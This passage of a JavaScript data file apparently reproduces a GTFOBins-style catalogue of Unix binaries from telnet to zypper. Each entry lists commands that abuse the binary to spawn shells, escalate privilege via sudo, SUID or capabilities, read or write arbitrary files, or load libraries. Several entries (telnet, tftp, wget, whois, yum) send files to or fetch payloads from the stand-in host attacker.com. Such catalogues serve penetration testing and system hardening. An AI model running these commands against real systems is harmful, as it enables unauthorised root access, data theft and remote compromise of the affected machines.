            "limited-suid": ["sudo install -m =xs $(which telnet) .\n\nRHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ terraform ============ */
    {
        name: "terraform",
        functions: {
            "file-read": ["terraform console\nfile(\"file_to_read\")"],
            "suid": ["sudo install -m =xs $(which terraform) .\n\n./terraform console\nfile(\"file_to_read\")"],
            "sudo": ["sudo terraform console\nfile(\"file_to_read\")"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ tex ============ */
    {
        name: "tex",
        functions: {
            "shell": ["tex --shell-escape '\\write18{/bin/sh}\\end'"],
            "sudo": ["sudo tex --shell-escape '\\write18{/bin/sh}\\end'"],
            "limited-suid": ["sudo install -m =xs $(which tex) .\n\n./tex --shell-escape '\\write18{/bin/sh}\\end'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ tftp ============ */
    {
        name: "tftp",
        functions: {
            "file-upload": ["RHOST=attacker.com\ntftp $RHOST\nput file_to_send"],
            "file-download": ["RHOST=attacker.com\ntftp $RHOST\nget file_to_get"],
            "suid": ["sudo install -m =xs $(which tftp) .\n\nRHOST=attacker.com\n./tftp $RHOST\nput file_to_send"],
            "sudo": ["RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ tic ============ */
    {
        name: "tic",
        functions: {
            "file-read": ["LFILE=file_to_read\ntic -C \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which tic) .\n\nLFILE=file_to_read\n./tic -C \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo tic -C \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ time ============ */
    {
        name: "time",
        functions: {
            "shell": ["/usr/bin/time /bin/sh"],
            "suid": ["sudo install -m =xs $(which time) .\n\n./time /bin/sh -p"],
            "sudo": ["sudo /usr/bin/time /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ timedatectl ============ */
    {
        name: "timedatectl",
        functions: {
            "shell": ["timedatectl list-timezones\n!/bin/sh"],
            "sudo": ["sudo timedatectl list-timezones\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ timeout ============ */
    {
        name: "timeout",
        functions: {
            "shell": ["timeout 7d /bin/sh"],
            "suid": ["sudo install -m =xs $(which timeout) .\n\n./timeout 7d /bin/sh -p"],
            "sudo": ["sudo timeout --foreground 7d /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ tmate ============ */
    {
        name: "tmate",
        functions: {
            "shell": ["tmate -c /bin/sh"],
            "sudo": ["sudo tmate -c /bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which tmate) .\n\n./tmate -c /bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ tmux ============ */
    {
        name: "tmux",
        functions: {
            "shell": ["tmux"],
            "file-read": ["LFILE=file_to_read\ntmux -f $LFILE"],
            "sudo": ["sudo tmux"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ top ============ */
    {
        name: "top",
        functions: {
            "shell": ["echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop"],
            "sudo": ["echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ torify ============ */
    {
        name: "torify",
        functions: {
            "shell": ["torify /bin/sh"],
            "sudo": ["sudo torify /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ torsocks ============ */
    {
        name: "torsocks",
        functions: {
            "shell": ["torsocks /bin/sh"],
            "sudo": ["sudo torsocks /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ troff ============ */
    {
        name: "troff",
        functions: {
            "file-read": ["LFILE=file_to_read\ntroff $LFILE"],
            "suid": ["sudo install -m =xs $(which troff) .\n\nLFILE=file_to_read\n./troff $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo troff $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ tshark ============ */
    {
        name: "tshark",
        functions: {
            "shell": ["TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\ntshark -Xlua_script:$TF"]
        },
        contexts: ["unprivileged"]
    },

    /* ============ ul ============ */
    {
        name: "ul",
        functions: {
            "file-read": ["LFILE=file_to_read\nul \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which ul) .\n\nLFILE=file_to_read\n./ul \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo ul \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ unexpand ============ */
    {
        name: "unexpand",
        functions: {
            "file-read": ["LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which unexpand) .\n\nLFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ uniq ============ */
    {
        name: "uniq",
        functions: {
            "file-read": ["LFILE=file_to_read\nuniq \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which uniq) .\n\nLFILE=file_to_read\n./uniq \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo uniq \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ unshare ============ */
    {
        name: "unshare",
        functions: {
            "shell": ["unshare /bin/sh"],
            "suid": ["sudo install -m =xs $(which unshare) .\n\n./unshare -r /bin/sh"],
            "sudo": ["sudo unshare /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ unsquashfs ============ */
    {
        name: "unsquashfs",
        functions: {
            "suid": ["sudo install -m =xs $(which unsquashfs) .\n\n./unsquashfs shell\n./squashfs-root/sh -p"],
            "sudo": ["sudo unsquashfs shell\n./squashfs-root/sh -p"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ unzip ============ */
    {
        name: "unzip",
        functions: {
            "suid": ["sudo install -m =xs $(which unzip) .\n\n./unzip -K shell.zip\n./sh -p"],
            "sudo": ["sudo unzip -K shell.zip\n./sh -p"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ update-alternatives ============ */
    {
        name: "update-alternatives",
        functions: {
            "suid": ["sudo install -m =xs $(which update-alternatives) .\n\nLFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0"],
            "sudo": ["LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ uudecode ============ */
    {
        name: "uudecode",
        functions: {
            "file-read": ["LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"],
            "suid": ["sudo install -m =xs $(which uudecode) .\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"],
            "sudo": ["LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ uuencode ============ */
    {
        name: "uuencode",
        functions: {
            "file-read": ["LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"],
            "suid": ["sudo install -m =xs $(which uuencode) .\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"],
            "sudo": ["LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ vagrant ============ */
    {
        name: "vagrant",
        functions: {
            "shell": ["cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up"],
            "suid": ["sudo install -m =xs $(which vagrant) .\n\ncd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up"],
            "sudo": ["cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ valgrind ============ */
    {
        name: "valgrind",
        functions: {
            "shell": ["valgrind /bin/sh"],
            "sudo": ["sudo valgrind /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ varnishncsa ============ */
    {
        name: "varnishncsa",
        functions: {
            "suid": ["sudo install -m =xs $(which varnishncsa) .\n\nLFILE=file_to_write\n./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\""],
            "sudo": ["LFILE=file_to_write\nsudo varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\""]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ vi ============ */
    {
        name: "vi",
        functions: {
            "shell": ["vi -c ':!/bin/sh' /dev/null"],
            "file-write": ["vi file_to_write\niDATA\n^[\nw"],
            "file-read": ["vi file_to_read"],
            "sudo": ["sudo vi -c ':!/bin/sh' /dev/null"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ view ============ */
    {
        name: "view",
        functions: {
            "shell": ["view -c ':!/bin/sh'"],
            "file-write": ["view file_to_write\niDATA\n^[\nw!"],
            "file-read": ["view file_to_read"],
            "library-load": ["view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"],
            "suid": ["sudo install -m =xs $(which view) .\n\n./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"],
            "sudo": ["sudo view -c ':!/bin/sh'"],
            "capabilities": ["cp $(which view) .\nsudo setcap cap_setuid+ep view\n\n./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
            "limited-suid": ["sudo install -m =xs $(which view) .\n\n./view -c ':lua os.execute(\"reset; exec sh\")'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "capabilities", "limited-suid"]
    },

    /* ============ vigr ============ */
    {
        name: "vigr",
        functions: {
            "suid": ["sudo install -m =xs $(which vigr) .\n\n./vigr"],
            "sudo": ["sudo vigr"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ vim ============ */
    {
        name: "vim",
        functions: {
            "shell": ["vim -c ':!/bin/sh'"],
            "file-write": ["vim file_to_write\niDATA\n^[\nw"],
            "file-read": ["vim file_to_read"],
            "library-load": ["vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"],
            "suid": ["sudo install -m =xs $(which vim) .\n\n./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"],
            "sudo": ["sudo vim -c ':!/bin/sh'"],
            "capabilities": ["cp $(which vim) .\nsudo setcap cap_setuid+ep vim\n\n./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
            "limited-suid": ["sudo install -m =xs $(which vim) .\n\n./vim -c ':lua os.execute(\"reset; exec sh\")'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "capabilities", "limited-suid"]
    },

    /* ============ vimdiff ============ */
    {
        name: "vimdiff",
        functions: {
            "shell": ["vimdiff -c ':!/bin/sh'"],
            "file-write": ["vimdiff file_to_write\niDATA\n^[\nw"],
            "file-read": ["vimdiff file_to_read"],
            "library-load": ["vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"],
            "suid": ["sudo install -m =xs $(which vimdiff) .\n\n./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"],
            "sudo": ["sudo vimdiff -c ':!/bin/sh'"],
            "capabilities": ["cp $(which vimdiff) .\nsudo setcap cap_setuid+ep vimdiff\n\n./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
            "limited-suid": ["sudo install -m =xs $(which vimdiff) .\n\n./vimdiff -c ':lua os.execute(\"reset; exec sh\")'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "capabilities", "limited-suid"]
    },

    /* ============ vipw ============ */
    {
        name: "vipw",
        functions: {
            "suid": ["sudo install -m =xs $(which vipw) .\n\n./vipw"],
            "sudo": ["sudo vipw"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ virsh ============ */
    {
        name: "virsh",
        functions: {
            "file-write": ["LFILE_DIR=/root\nLFILE_NAME=file_to_write\necho 'data' > data_to_write\nTF=$(mktemp)\ncat > $TF <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>$LFILE_DIR/$LFILE_NAME</key>\n  <source></source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>$LFILE_DIR/$LFILE_NAME</path>\n    <format type='raw'/>\n  </target>\n</volume>\nEOF\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-create --pool x --file $TF\nvirsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write\nvirsh -c qemu:///system pool-destroy x"],
            "file-read": ["LFILE_DIR=/root\nLFILE_NAME=file_to_read\nSPATH=file_to_save\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH\nvirsh -c qemu:///system pool-destroy x"],
            "sudo": ["SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os><type arch='x86_64'>hvm</type></os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ volatility ============ */
    {
        name: "volatility",
        functions: {
            "shell": ["volatility -f file.dump volshell\n__import__('os').system('/bin/sh')"]
        },
        contexts: ["unprivileged"]
    },

    /* ============ w3m ============ */
    {
        name: "w3m",
        functions: {
            "file-read": ["LFILE=file_to_read\nw3m \"$LFILE\" -dump"],
            "suid": ["sudo install -m =xs $(which w3m) .\n\nLFILE=file_to_read\n./w3m \"$LFILE\" -dump"],
            "sudo": ["LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ wall ============ */
    {
        name: "wall",
        functions: {
            "sudo": ["LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\""]
        },
        contexts: ["sudo"]
    },

    /* ============ watch ============ */
    {
        name: "watch",
        functions: {
            "shell": ["watch -x sh -c 'reset; exec sh 1>&0 2>&0'"],
            "suid": ["sudo install -m =xs $(which watch) .\n\n./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"],
            "sudo": ["sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"],
            "limited-suid": ["sudo install -m =xs $(which watch) .\n\n./watch 'reset; exec sh 1>&0 2>&0'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "limited-suid"]
    },

    /* ============ wc ============ */
    {
        name: "wc",
        functions: {
            "file-read": ["LFILE=file_to_read\nwc --files0-from \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which wc) .\n\nLFILE=file_to_read\n./wc --files0-from \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ wget ============ */
    {
        name: "wget",
        functions: {
            "shell": ["TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nwget --use-askpass=$TF 0"],
            "file-upload": ["URL=http://attacker.com/\nLFILE=file_to_send\nwget --post-file=$LFILE $URL"],
            "file-download": ["URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nwget $URL -O $LFILE"],
            "file-write": ["LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\nwget -i $TF -o $LFILE"],
            "file-read": ["LFILE=file_to_read\nwget -i $LFILE"],
            "suid": ["sudo install -m =xs $(which wget) .\n\nTF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0"],
            "sudo": ["TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ whiptail ============ */
    {
        name: "whiptail",
        functions: {
            "file-read": ["LFILE=file_to_read\nwhiptail --textbox --scrolltext \"$LFILE\" 0 0"],
            "suid": ["sudo install -m =xs $(which whiptail) .\n\nLFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0"],
            "sudo": ["LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ whois ============ */
    {
        name: "whois",
        functions: {
            "file-upload": ["RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`cat $LFILE`\""],
            "file-download": ["RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\""]
        },
        contexts: ["unprivileged"]
    },

    /* ============ wireshark ============ */
    {
        name: "wireshark",
        functions: {
            "command": ["wireshark"],
            "sudo": ["PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\""]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ wish ============ */
    {
        name: "wish",
        functions: {
            "shell": ["wish\nexec /bin/sh <@stdin >@stdout 2>@stderr"],
            "sudo": ["sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ xargs ============ */
    {
        name: "xargs",
        functions: {
            "shell": ["xargs -a /dev/null sh"],
            "file-read": ["LFILE=file_to_read\nxargs -a \"$LFILE\" -0"],
            "suid": ["sudo install -m =xs $(which xargs) .\n\n./xargs -a /dev/null sh -p"],
            "sudo": ["sudo xargs -a /dev/null sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ xdg-user-dir ============ */
    {
        name: "xdg-user-dir",
        functions: {
            "shell": ["xdg-user-dir '}; /bin/sh #'"],
            "sudo": ["sudo xdg-user-dir '}; /bin/sh #'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ xdotool ============ */
    {
        name: "xdotool",
        functions: {
            "shell": ["xdotool exec --sync /bin/sh"],
            "suid": ["sudo install -m =xs $(which xdotool) .\n\n./xdotool exec --sync /bin/sh -p"],
            "sudo": ["sudo xdotool exec --sync /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ xelatex ============ */
    {
        name: "xelatex",
        functions: {
            "shell": ["xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"],
            "sudo": ["sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"],
            "limited-suid": ["sudo install -m =xs $(which xelatex) .\n\n./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ xetex ============ */
    {
        name: "xetex",
        functions: {
            "shell": ["xetex --shell-escape '\\write18{/bin/sh}\\end'"],
            "sudo": ["sudo xetex --shell-escape '\\write18{/bin/sh}\\end'"],
            "limited-suid": ["sudo install -m =xs $(which xetex) .\n\n./xetex --shell-escape '\\write18{/bin/sh}\\end'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ xmodmap ============ */
    {
        name: "xmodmap",
        functions: {
            "file-read": ["LFILE=file_to_read\nxmodmap -v $LFILE"],
            "suid": ["sudo install -m =xs $(which xmodmap) .\n\nLFILE=file_to_read\n./xmodmap -v $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo xmodmap -v $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ xmore ============ */
    {
        name: "xmore",
        functions: {
            "file-read": ["LFILE=file_to_read\nxmore $LFILE"],
            "suid": ["sudo install -m =xs $(which xmore) .\n\nLFILE=file_to_read\n./xmore $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo xmore $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ xpad ============ */
    {
        name: "xpad",
        functions: {
            "file-read": ["LFILE=file_to_read\nxpad -f \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo xpad -f \"$LFILE\""]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ xxd ============ */
    {
        name: "xxd",
        functions: {
            "file-write": ["LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\""],
            "file-read": ["LFILE=file_to_read\nxxd \"$LFILE\" | xxd -r"],
            "suid": ["sudo install -m =xs $(which xxd) .\n\nLFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r"],
            "sudo": ["LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ xz ============ */
    {
        name: "xz",
        functions: {
            "file-read": ["LFILE=file_to_read\nxz -c \"$LFILE\" | xz -d"],
            "suid": ["sudo install -m =xs $(which xz) .\n\nLFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d"],
            "sudo": ["LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ yarn ============ */
    {
        name: "yarn",
        functions: {
            "shell": ["yarn exec /bin/sh"],
            "sudo": ["sudo yarn exec /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ yash ============ */
    {
        name: "yash",
        functions: {
            "shell": ["yash"],
            "suid": ["sudo install -m =xs $(which yash) .\n\n./yash"],
            "sudo": ["sudo yash"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ yelp ============ */
    {
        name: "yelp",
        functions: {
            "file-read": ["LFILE=file_to_read\nyelp \"man:$LFILE\""]
        },
        contexts: ["unprivileged"]
    },

    /* ============ yum ============ */
    {
        name: "yum",
        functions: {
            "file-download": ["RHOST=attacker.com\nRFILE=file_to_get.rpm\nyum install http://$RHOST/$RFILE"],
            "sudo": ["TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\nsudo yum localinstall -y x-1.0-1.noarch.rpm"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ zathura ============ */
    {
        name: "zathura",
        functions: {
            "shell": ["zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'"],
            "sudo": ["sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ zip ============ */
    {
        name: "zip",
        functions: {
            "shell": ["TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF"],
            "file-read": ["LFILE=file-to-read\nTF=$(mktemp -u)\nzip $TF $LFILE\nunzip -p $TF"],
            "sudo": ["TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF"],
            "limited-suid": ["sudo install -m =xs $(which zip) .\n\nTF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ zsh ============ */
    {
        name: "zsh",
        functions: {
            "shell": ["zsh"],
            "file-write": ["export LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'"],
            "file-read": ["export LFILE=file_to_read\nzsh -c 'echo \"$(<$LFILE)\"'"],
            "suid": ["sudo install -m =xs $(which zsh) .\n\n./zsh"],
            "sudo": ["sudo zsh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ zsoelim ============ */
    {
        name: "zsoelim",
        functions: {
            "file-read": ["LFILE=file_to_read\nzsoelim \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which zsoelim) .\n\nLFILE=file_to_read\n./zsoelim \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo zsoelim \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ zypper ============ */
    {
        name: "zypper",
        functions: {
            "shell": ["zypper x"],
            "sudo": ["sudo zypper x"]
        },
        contexts: ["unprivileged", "sudo"]
    }

];

// ============================================================
// DEBUG: confirm load
// ============================================================
console.log(`data.js loaded: ${window.BINARIES_DATA.length} binaries`);